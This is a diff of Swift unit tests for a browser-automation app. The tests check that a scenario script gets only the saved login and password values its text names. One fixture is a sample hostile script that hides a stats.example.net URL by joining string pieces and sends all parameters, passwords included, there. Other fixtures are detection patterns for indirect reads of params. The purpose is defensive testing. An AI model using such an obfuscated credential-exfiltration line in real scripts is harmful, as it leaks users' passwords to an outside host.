@@ -38,25 +38,73 @@ final class ScenarioValuesTests: XCTestCase {
         XCTAssertEqual(values.values(of: shop).count, ScenarioValues.maximumCount)
     }
 
+    private func object(_ json: String) throws -> [String: Any] {
+        try XCTUnwrap(try JSONSerialization.jsonObject(with: Data(json.utf8)) as? [String: Any])
+    }
+
     func testARunsParametersAreTheProfilesOwnUnderWhatTheRunWasGiven() throws {
         var values = ScenarioValues()
         values.set([value("login", "alice"), value("password", "s3 \"cret\"\n")], for: shop)
         values.set([value("login", "bob")], for: mail)
-        func object(_ json: String) throws -> [String: Any] {
-            try XCTUnwrap(try JSONSerialization.jsonObject(with: Data(json.utf8)) as? [String: Any])
-        }
+        let signIn = "await page.type('#user', params.login || '');\nawait page.type('#pass', params.password || '');\n"
         // Each profile its own; a profile without any, an empty object.
-        let own = try object(values.parametersJSON(for: shop))
+        let own = try object(values.parametersJSON(for: shop, readBy: signIn))
         XCTAssertEqual(own["login"] as? String, "alice")
         XCTAssertEqual(own["password"] as? String, "s3 \"cret\"\n", "a value is text as it was written")
-        XCTAssertEqual(try object(values.parametersJSON(for: mail))["login"] as? String, "bob")
-        XCTAssertEqual(values.parametersJSON(for: UUID()), "{}")
+        XCTAssertEqual(try object(values.parametersJSON(for: mail, readBy: signIn))["login"] as? String, "bob")
+        XCTAssertEqual(values.parametersJSON(for: UUID(), readBy: signIn), "{}")
         // What the run was given itself wins, name by name, and keeps its kind.
-        XCTAssertEqual(values.parametersJSON(for: shop, over: #"{"login": "carol", "pages": 3, "deep": {"a": [1, 2]}}"#),
+        XCTAssertEqual(values.parametersJSON(for: shop, readBy: signIn, over: #"{"login": "carol", "pages": 3, "deep": {"a": [1, 2]}}"#),
                        #"{"deep":{"a":[1,2]},"login":"carol","pages":3,"password":"s3 \"cret\"\n"}"#)
         // What is not an object's text counts as nothing given.
         for odd in ["", "[1]", "\"text\"", "not json"] {
-            XCTAssertEqual(try object(values.parametersJSON(for: mail, over: odd))["login"] as? String, "bob", odd)
+            XCTAssertEqual(try object(values.parametersJSON(for: mail, readBy: signIn, over: odd))["login"] as? String, "bob", odd)
+        }
+    }
+
+    /// A run gets the profile's values its text names, and no other: a scenario from someone else
+    /// that reads `params` as a whole, or by names it builds, does not collect the passwords kept
+    /// for the other scenarios — what the review, the list and the editor show is what is given.
+    func testARunGetsOnlyTheValuesItsTextNames() throws {
+        var values = ScenarioValues()
+        values.set([value("login", "alice"), value("password", "s3cret"), value("mail_password", "kept-for-the-mail")], for: shop)
+        // The recorder's sign-in names login and password (the password in its note): those two.
+        let recorded = "await page.type('#user', params.login || '');\n"
+            + "await page.type('#pass', params.password || ''); // the password is not recorded: pass it as params.password\n"
+        XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: recorded)).keys.sorted(), ["login", "password"])
+        // Every template's own: what it takes, and nothing more.
+        for template in ScenarioTemplate.all {
+            let source = template.source { "<\($0)>" }
+            XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: source)).keys.sorted(),
+                           template.takes.filter { ["login", "password"].contains($0) }.sorted(), template.id)
+        }
+        // A text that names none but sends `params` whole gets none of them; the request's own still come.
+        let collecting = "const PAGE = 'https://social.example/feed';\nawait page.goto(PAGE);\n"
+            + "const report = ['ht', 'tps:/', '/stats.', 'example', '.net/r?d='].join('') + encodeURIComponent(JSON.stringify(params));\n"
+            + "await page.goto(report);\nreturn 'liked';\n"
+        XCTAssertEqual(ScenarioValues.namesRead(by: collecting), [])
+        XCTAssertTrue(ScenarioValues.readsByBuiltNames(collecting))
+        XCTAssertEqual(values.parametersJSON(for: shop, readBy: collecting), "{}")
+        XCTAssertEqual(values.parametersJSON(for: shop, readBy: collecting, over: #"{"n": 2}"#), #"{"n":2}"#)
+        // One that names login and reads the rest by built names: login alone.
+        let more = "await page.type('#u', params.login);\nfor (const k of Object.keys(params)) log(params[k]);\n"
+        XCTAssertEqual(try object(values.parametersJSON(for: shop, readBy: more)).keys.sorted(), ["login"])
+    }
+
+    func testWhetherATextReadsParamsByNamesItBuilds() {
+        for text in ["log(JSON.stringify(params));", "log(Object.values(params));", "log(params[key]);", "const p = params; log(p.login);",
+                     "const { login } = params;", "log({...params});", "log(params?.login);", "log(eval('par' + 'ams'));", "log(x.params);",
+                     "log(params['a' + 'b']);", "/* a comment */ log(params);"] {
+            XCTAssertTrue(ScenarioValues.readsByBuiltNames(text), text)
+        }
+        for text in ["await page.type('#a', params.login || '');", "log(params['code'], params[\"pin\"], params . spaced);",
+                     "// params alone, in a comment\nlog(1);", "/* JSON.stringify(params) */ log(params.a);",
+                     "const myparams = 1; log(params_x, $params, myparams);", "await page.evaluate(() => 1);", ""] {
+            XCTAssertFalse(ScenarioValues.readsByBuiltNames(text), text)
+        }
+        // The templates name what they read; "fill in a form" reads `params[…]` by the names its lines give.
+        for template in ScenarioTemplate.all {
+            XCTAssertEqual(ScenarioValues.readsByBuiltNames(template.source { "<\($0)>" }), template.id == "form", template.id)
         }
     }
 
